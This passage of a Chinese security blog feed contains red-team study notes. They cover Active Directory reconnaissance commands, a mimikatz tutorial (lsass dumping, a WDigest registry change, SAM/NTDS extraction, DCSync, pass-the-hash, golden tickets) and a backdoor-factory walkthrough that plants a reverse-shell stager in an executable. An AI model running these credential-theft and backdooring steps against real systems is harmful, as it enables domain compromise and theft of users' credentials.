title="2.6扫描域内端口"></a>2.6扫描域内端口</h2><p>telnet(但是这个速度太慢了点)</p><p>S扫描器</p><p>Metasploit端口扫描</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gams">auxiliary/scanner/portscan/tcp<br><span class="hljs-keyword">set</span> ports <span class="hljs-comment">1-1000</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">RHOST 192.168.1.1</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">THREADS 10</span><br>run<br></code></pre></td></tr></table></figure><p>PowerSploit、NiShang的Invoke-portscan脚本</p><h2 id="2-7-收集域内基础信息"><a href="#2-7-收集域内基础信息" class="headerlink" title="2.7 收集域内基础信息"></a>2.7 收集域内基础信息</h2><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">net</span> <span class="hljs-keyword">view</span> /domain<br><span class="hljs-comment">//查询域</span><br><br><span class="hljs-keyword">net</span> <span class="hljs-keyword">view</span> /domain:<span class="hljs-keyword">test</span><br><span class="hljs-comment">//查询域内所有计算机</span><br><br><span class="hljs-keyword">net</span> group /domain<br><span class="hljs-comment">//查询域内所有用户组列表</span><br><br><span class="hljs-keyword">net</span> group <span class="hljs-string">&quot;domain computers&quot;</span> /domain<br><span class="hljs-comment">//查询所有域成员计算机列表</span><br><br><span class="hljs-keyword">net</span> accounts /domain<br><span class="hljs-comment">//获取域内密码信息</span><br><br>nltest /domain_trusts<br><span class="hljs-comment">//域内信任信息</span><br></code></pre></td></tr></table></figure><h2 id="2-8-查找域控"><a href="#2-8-查找域控" class="headerlink" title="2.8 查找域控"></a>2.8 查找域控</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>可以看，域控制器的机器名<br>nltest /DCLIST:test<br><span class="hljs-regexp">//</span>查询当前时间<br>net time /domain<br><span class="hljs-regexp">//</span>查询域控制器的主机名<br>Nslookup -type=SRV _ldap._tcp<br><span class="hljs-regexp">//</span>查询域控制器组<br>net group <span class="hljs-string">&quot;Domain Controllers&quot;</span> /domain<br><span class="hljs-regexp">//</span>查看主控制器，可以看见域控制器的机器名<br>netdom query pdc<br></code></pre></td></tr></table></figure><h2 id="2-9-获取域内的用户和管理员信息"><a href="#2-9-获取域内的用户和管理员信息" class="headerlink" title="2.9 获取域内的用户和管理员信息"></a>2.9 获取域内的用户和管理员信息</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>查询所有域用户列表<br>net user /domain<br><br><span class="hljs-regexp">//</span>获取域内用户的详细信息<br>wmic useraccount get /all<br><br><span class="hljs-regexp">//</span>查看存在的用户,但是这个只能在域控或者安装了对应服务的主机使用，否则会提示命令不存在<br>dsquery user<br><br><span class="hljs-regexp">//</span>查找目录中的计算机<br>dsquery computer<br><br><span class="hljs-regexp">//</span>查询本地管理员组用户<br>net localgroup administrators<br><br><span class="hljs-regexp">//</span>查询域管理员用户组<br>net group <span class="hljs-string">&quot;domain admins&quot;</span> /domain<br><br><span class="hljs-regexp">//</span>查询管理员用户组<br>net group <span class="hljs-string">&quot;Enterprise Admins&quot;</span> /domain<br></code></pre></td></tr></table></figure><p>2.10 定位域管理员</p><p>在获取了Windows域中的普通权限在进行横向渗透时，需要知道域内用户登录的位置，是否是任何系统&#x2F;主机的本地管理员，以及所属组等信息。能够使用的工具有：psloggedon.exe、PVEFindADUser.exe、netness.exe、hunter、NetView、PowerView。</p><p>psloggedon.exe等</p><p>能够通过此工具查看远程计算机的资源，也就是说能够查看目标主机有哪些账户在登录状态</p><p>下载地址：<a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/psloggedon">https://docs.microsoft.com/zh-cn/sysinternals/downloads/psloggedon</a></p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livescript">psloggedon.exe <span class="hljs-string">\\dc2012</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210121144105755.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>PVEFindADUser</p><p>PVEFindADUser能够用于查找活动目录用户登录的位置，枚举与用户，以及查找在特定计算机上登录的用户。包括本地用户、通过RDP登录的用户、用于运行服务和计划任务的用户。（这个工具需要.NET 3.5）</p><p>Windows Server 2012安装.NET 3.5可能不成功，需要指定安装源：</p><p><img src="https://img-blog.csdnimg.cn/20210121144258691.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>下载地址：<a href="https://github.com/chrisdee/Tools/tree/master/AD/ADFindUsersLoggedOn">https://github.com/chrisdee/Tools/tree/master/AD/ADFindUsersLoggedOn</a></p><figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nsis">PVEFindADUser.exe -<span class="hljs-literal">current</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/2021012114432143.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>NetView</p><p>NetView是一个枚举工具，使用WinAPI枚举系统，利用NetSessionEnum找寻登陆会话，利用NetShareEnum找寻共享，利用NetWkstaUserEnum枚举登录的用户。同时还能够查询共享入口和有价值的用户。</p><p>下载地址：<a href="https://github.com/mubix/netview">https://github.com/mubix/netview</a></p><p>Netness</p><p>PowerView</p><p>使用Powerview的Invoke-UserHunter。</p><p> Empire</p><p>Empire中也存在此类型的脚本：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">usemodule situational_awareness<span class="hljs-regexp">/network/</span>powerview/user_hunter<br>execute<br></code></pre></td></tr></table></figure><p>Nmap的NSE脚本</p><p>通过Nmap的NSE脚本获取远程机器的登陆会话。</p><p>smb-enum-sessions.nse获取域内主机的用户登录会话，查看当前是否有用户登录。下载地址：<a href="https://nmap.org/nsedoc/scripts/smb-enum-sessions.html">https://nmap.org/nsedoc/scripts/smb-enum-sessions.html</a></p><p>smb-enum-domains.nse对域控制器进行信息收集，可以获取主机信息用户、可使用密码策略的用户等。</p><p>smb-enum-users.nse可以使用此脚本对域控进行扫描。</p><p> 2.11 查找域管理进程</p><p>其中阿里云上有个链接也说到了类似的方法：<a href="https://yq.aliyun.com/articles/599377?type=2">https://yq.aliyun.com/articles/599377?type=2</a></p><p>本机检查：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>获取域管理员列表<br>net group <span class="hljs-string">&quot;Domain Admins&quot;</span> /domain<br><br><span class="hljs-regexp">//</span>列出本机的所有进程和进程用户<br>tasklist /v<br></code></pre></td></tr></table></figure><p>查询域控的域用户会话</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>查询域控列表<br>net group <span class="hljs-string">&quot;Domain Controllers&quot;</span> /domain<br><br><span class="hljs-regexp">//</span>收集所有活动域的会话列表<br>netsess -h<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>内网安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>内网安全</tag>
      
      <tag>信息收集</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>mimikatz使用</title>
    <link href="/2022/06/15/mimikatz%E4%BD%BF%E7%94%A8/mimikatz%E4%BD%BF%E7%94%A8/"/>
    <url>/2022/06/15/mimikatz%E4%BD%BF%E7%94%A8/mimikatz%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Mimikatz 是一款功能强大的轻量级调试神器，通过它你可以提升进程权限注入进程读取进程内存，当然他最大的亮点就是他可以直接从 lsass.exe 进程中获取当前登录系统用户名的密码， lsass是微软Windows系统的安全机制它主要用于本地安全和登陆策略，通常我们在登陆系统时输入密码之后，密码便会储存在 lsass内存中，经过其 wdigest 和 tspkg 两个模块调用后，对其使用可逆的算法进行加密并存储在内存之中， 而 mimikatz 正是通过对lsass逆算获取到明文密码！也就是说只要你不重启电脑，就可以通过他获取到登陆密码，只限当前登陆系统！</p><h2 id="使用："><a href="#使用：" class="headerlink" title="使用："></a>使用：</h2><p><strong>- 获取本地账号密码</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#提升权限</span><br>privilege::debug<br><br><span class="hljs-comment">#抓取密码</span><br>sekurlsa::logonpasswords<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210404131800192.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>当目标为win10或者2012R2以上时，默认在内存缓存中禁止保存明文密码，但可以通过修改注册表的方式抓取明文。<br>cmd修改注册表命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f<br></code></pre></td></tr></table></figure><p><strong>-  SAM表获取hash</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#导出SAM数据</span><br>reg save HKLM\SYSTEM SYSTEM<br>reg save HKLM\SAM SAM<br><br><span class="hljs-comment">#使用mimikatz提取hash</span><br>lsadump::sam /sam:SAM /system:SYSTEM<br></code></pre></td></tr></table></figure><p><strong>- Procdump+Mimikatz</strong><br>当mimikatz无法在主机上运行时，可以使用微软官方发布的工具Procdump导出lsass.exe:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">procdump64.exe -accepteula -ma lsass.exe lsass.dmp<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210404174413894.png" alt="在这里插入图片描述"></p><p>将lsass.dmp下载到本地后，然后执行mimikatz:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">sekurlsa::minidump lsass.dmp<br>sekurlsa::logonPasswords full<br></code></pre></td></tr></table></figure><p>为了方便复制与查看，可以输出到本地文件里面</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">mimikatz.exe  sekurlsa::logonPasswords full &gt; pssword.txt<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210404181255285.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210404181332603.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ul><li><strong>读取域控中域成员Hash</strong><br>域控以上域管理员身份执行mimikatz</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#提升权限</span><br>privilege::debug<br>抓取密码<br>lsadump::lsa /patch<br></code></pre></td></tr></table></figure><p>方法二：通过 dcsync，利用目录复制服务（DRS）从NTDS.DIT文件中检索密码哈希值，可以在域管权限下执行获取：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#获取所有域用户</span><br>lsadump::dcsync /domain:test.com /all /csv<br><br><span class="hljs-comment">#指定获取某个用户的hash</span><br>lsadump::dcsync /domain:test.com /user:<span class="hljs-built_in">test</span><br></code></pre></td></tr></table></figure><ul><li><strong>导出域成员Hash</strong><br>域账户的用户名和hash密码以域数据库的形式存放在域控制器的%SystemRoot%\ntds\NTDS.DIT文件中。<br>这里可以借助: ntdsutil.exe,域控制器自带的域数据库管理工具，我们可以通过域数据库，提取域种所有的域用户信息，在域控上执行如下命令，导入域数据库。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#创建快照</span><br>ntdsutil snapshot <span class="hljs-string">&quot;activate instance ntds&quot;</span> create quit quit<br><br><span class="hljs-comment">#加载快照</span><br>ntdsutil snapshot <span class="hljs-string">&quot;mount &#123;72ba82f0-5805-4365-a73c-0ccd01f5ed0d&#125;&quot;</span> quit quit<br><br><span class="hljs-comment">#Copy文件副本</span><br>copy C:\$SNAP_201911211122_VOLUMEC$\windows\NTDS\ntds.dit c:\ntds.dit<br></code></pre></td></tr></table></figure><ul><li><strong>哈希传递攻击</strong><br>当我们获得了一台主机得NTLM哈希值，我们可以使用mimikatz对其进行哈希传递攻击。执行完命令后，会弹出cmd窗口。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#使用administrator用户的NTLM哈希值进行攻击</span><br>sekurlsa::pth /user:administrator /domain:192.168.10.15 /ntlm:329153f560eb329c0e1deea55e88a1e9<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#使用xie用户的NTLM哈希值进行攻击</span><br>sekurlsa::pth /user:xie /domain:192.168.10.15 /ntlm:329153f560eb329c0e1deea55e88a1e9<br></code></pre></td></tr></table></figure><p><strong>- 域环境</strong><br>在域环境中，当我们获取得了域内用户得HTML哈希值，我们可以使用域内得一台主机用mimikatz对域控进行哈希传递攻击。执行完命令后，会弹出cmd窗口。前提是我们必须拥有域内任意一台主机得本地administrator权限和获得了域内用户得NTLM哈希值<br>域：xie.com<br>域控：WIN2008.xie.com</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#使用域管理员administrator的NTLM哈希值对域控进行哈希传递攻击</span><br>sekurlsa::pth /user:administrator /domain:<span class="hljs-string">&quot;xie.com&quot;</span> /ntlm:dbd621b8ed24eb627d32514476fac6c5 <br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#使用域用户xie的NTLM哈希值对域控进行哈希传递攻击</span><br>sekurlsa::pth /user:xie /domain:<span class="hljs-string">&quot;xie.com&quot;</span> /ntlm:329153f560eb329c0e1deea55e88a1e9   <br></code></pre></td></tr></table></figure><h2 id="票据传递攻击PPT"><a href="#票据传递攻击PPT" class="headerlink" title="票据传递攻击PPT"></a>票据传递攻击PPT</h2><p><strong>- 黄金票据</strong><br>域内每个用户得ticket都是由krbtgt的密码hash来计算生成的，因此只要获取到了krbtgt用户的密码Hash，就可以随意伪造Ticket,进而使用Ticket登录域控制器，使用krbtgt用户hash生成的票据被称为Golden Ticket,此类攻击方法被称为票据传递攻击。<br>首先获取krbtgt的用户hash:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">mimikatz <span class="hljs-string">&quot;lsadump::dcsync /domain:xx.com /user:krbtgt&quot;</span><br></code></pre></td></tr></table></figure><p>利用 mimikatz 生成域管权限的 Golden Ticket，填入对应的域管理员账号、域名称、sid值，如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">kerberos::golden /admin:administrator /domain:ABC.COM /sid:S-1-5-21-3912242732-2617380311-62526969 /krbtgt:c7af5cfc450e645ed4c46daa78fe18da /ticket:test.kiribi<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#导入刚才生成的票据</span><br>kerberos::ptt test.kiribi<br><br><span class="hljs-comment">#导入成功后可获取域管权限</span><br><span class="hljs-built_in">dir</span> \\dc.abc.com\c$<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>内网安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>内网安全</tag>
      
      <tag>mimikatz</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>backdoor-factory工具使用</title>
    <link href="/2022/06/15/backdoor-factory%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/backdoor-factor/"/>
    <url>/2022/06/15/backdoor-factory%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/backdoor-factor/</url>
    
    <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>backdoor-factory是一款后门构建工具。与其他工具不同的是，他不会增加软件的大小，而是利用代码缝隙进行注入，免杀效果更好。<br>项目地址： <a href="https://github.com/secretsquirrel/the-backdoor-factory.git">https://github.com/secretsquirrel/the-backdoor-factory.git</a></p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>这里我在ubuntu的机子上安全，这里选择安装的机制最好内置的是Python2.7的环境不然要出问题。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">wget https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html<br>git <span class="hljs-built_in">clone</span> https://github.com/secretsquirrel/the-backdoor-factory.git<br>sudo pip install capstone<br></code></pre></td></tr></table></figure><p>下载好后进入目录<br><img src="https://img-blog.csdnimg.cn/20210425101206929.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/20210425101235182.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>安装成功</p><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>backdoor-factory常用命令<br>-h                  查看帮助信息</p><p>-f                   测试指定文件</p><p>-S                  检查软件是否支持patch</p><p>-s                   指定payload，可以通过”show”来查看</p><p>-H                  指定回连的IP地址</p><p>-P                  指定回连的端口</p><p>-J                   使用多个代码缝隙注入</p><p>-c                   查看软件的代码缝隙</p><p>-l   num          和” -c” 一起使用,查看大于num的缝隙</p><p>-o                   指定输出软件的名称<br><img src="https://img-blog.csdnimg.cn/20210425101622640.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>可以看到是支持patch的，可以继续<br>接下来插shellcode<br>先查看可用的payload         -s show<br><img src="https://img-blog.csdnimg.cn/20210425101752159.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这里我选择   iat_reverse_tcp_stager_threaded<br><img src="https://img-blog.csdnimg.cn/20210425103452519.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>回车执行后，我们可以看到以下界面。这里要求我们选择 code cave ，提示我们要注入到那个区段，这里我就选择2注入到rsrc区段。<br><img src="https://img-blog.csdnimg.cn/20210425103632390.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>生成成功。接下来在kali的msf中设置监听<br><img src="https://img-blog.csdnimg.cn/20210425103836947.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>设置成功，运行，并将生成的exe文件扔到目标机中<br><img src="https://img-blog.csdnimg.cn/20210425104033582.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>将文件扔进靶机并运行<br><img src="https://img-blog.csdnimg.cn/20210425104124268.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>成功拿到shell</p><p>这里只是我写的一个简单的笔记，想更深入了解的可以自行摸索，有错误还望指正</p>]]></content>
    
    
    <categories>
      
      <category>内网安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>内网安全</tag>
      
      <tag>backdoor-factor</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>powershell基础知识</title>
    <link href="/2022/06/15/powershell%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/powershell%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    <url>/2022/06/15/powershell%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/powershell%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</url>
    
    <content type="html"><![CDATA[<p>一旦攻击者可以在一台计算机上运行代码，就会下载powershell脚本文件(.ps1)到磁盘中 执行，甚至无需写到磁盘中执行，它可以直接在内存中运行，利用诸多特点攻击者可以持续攻击而不被轻易发现。</p><h4 id="常用的powershell攻击工具有以下几种："><a href="#常用的powershell攻击工具有以下几种：" class="headerlink" title="常用的powershell攻击工具有以下几种："></a>常用的powershell攻击工具有以下几种：</h4><ul><li><p>powerSploit:</p><p>常用于信息探测，权限提升，凭证窃取，持久化等操作</p></li><li><p>Nishang:</p><p>基于powershell的渗透测试专用工具，集成了框架，脚本和各种payload，包含下载和执行，键盘记录，DNS，延时命令等脚本</p></li><li><p>Empire:<br>基于powershell的远程控制木马，可以从凭证数据库中导出和跟踪凭证信息，常用于提供前期漏洞利用的集成模块，信息探测，凭证窃取，持久化控制。</p></li><li><p>powercat:<br>powershell版的Netcat,有着网络工具中的瑞士军刀美誉，他能通过tcp和udp在网络中读写数据，通过它和其他工具结合和重定向，读者可以在脚本中以多种方式使用它。</p></li></ul><h4 id="powershell优点："><a href="#powershell优点：" class="headerlink" title="powershell优点："></a>powershell优点：</h4><ul><li>windows7中默认安装了</li><li>powershell脚本可以运行在内存中，不需要写入磁盘</li><li>可以从另一个系统中下载powershell脚本并执行</li><li>目前很多工具都是基于powershell开发的</li><li>很多安全软件并不能检测到powershell的活动</li><li>cmd.exe通常会被阻止运行，但powershell不会</li><li>可以用来管理活动目录</li></ul><h5 id="查看版本：Get-Host"><a href="#查看版本：Get-Host" class="headerlink" title="查看版本：Get-Host"></a>查看版本：Get-Host</h5><p><img src="https://img-blog.csdnimg.cn/20210430172220730.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="powershell的基本概念"><a href="#powershell的基本概念" class="headerlink" title="powershell的基本概念"></a>powershell的基本概念</h2><p>一个powershell脚本其实就是一个简单的文本文件，这个文件包含了一系列powershell命令，每个命令显示为独立的一行，对于被视为powershell脚本的文本文件，他的文件名需要加上.PS1的扩展名</p><h4 id="执行策略："><a href="#执行策略：" class="headerlink" title="执行策略："></a>执行策略：</h4><p>为防止恶意脚本的执行，powershell有一个执行策略，默认情况下，这个执行策略被设置为受限</p><p>在powershell脚本无法执行时，可以使用下面的cmdlet命令来确定当前的执行策略</p><h5 id="Get-ExecutionPolicy："><a href="#Get-ExecutionPolicy：" class="headerlink" title="Get-ExecutionPolicy："></a>Get-ExecutionPolicy：</h5><ul><li><p>Restricted:脚本不能执行(默认设置)<br><img src="https://img-blog.csdnimg.cn/20210430172234427.png" alt="在这里插入图片描述"></p></li><li><p>RemoteSigned</p><p>本地创建的脚本可以运行，但从网上下载的脚本不能运行(拥有数字证书签名的除外)</p></li><li><p>AllSigned</p><p>仅当脚本由受信任的发布者签名时才能运行</p></li><li><p>Unrestricted</p><p>允许所有的script运行</p></li></ul><h5 id="设置执行策略：-必须为管理员权限"><a href="#设置执行策略：-必须为管理员权限" class="headerlink" title="设置执行策略：(必须为管理员权限)"></a>设置执行策略：(必须为管理员权限)</h5><p>  Set-ExecutionPolicy  &lt; policy name &gt;<br>  <img src="https://img-blog.csdnimg.cn/2021043015291932.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210430152930635.png" alt="在这里插入图片描述"></p><h4 id="运行脚本"><a href="#运行脚本" class="headerlink" title="运行脚本"></a>运行脚本</h4><p>运行一个脚本，必须键入完整的路劲和文件名，例如，你要运行一个名为a.ps1的脚本，可以键入c:\script\a.ps1</p><h4 id="管道："><a href="#管道：" class="headerlink" title="管道："></a>管道：</h4><p>管道的作用就是将一个命令的输出作为另一个命令的输入，两个命令之间用管道符号(|)连接</p><p>例如：</p><p>假设停止所有目前运行中的，以”p”字符开头命名的程序</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pow">get-process p* | stop-process<br></code></pre></td></tr></table></figure><h2 id="powershell的常用命令："><a href="#powershell的常用命令：" class="headerlink" title="powershell的常用命令："></a>powershell的常用命令：</h2><h4 id="基础："><a href="#基础：" class="headerlink" title="基础："></a>基础：</h4><p>在powershell下，类似“cmd命令”叫做”cmdlet”</p><ul><li><p>新建目录&#x2F;文件</p><p>New-Item</p></li></ul><p><img src="https://img-blog.csdnimg.cn/20210430153019493.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" 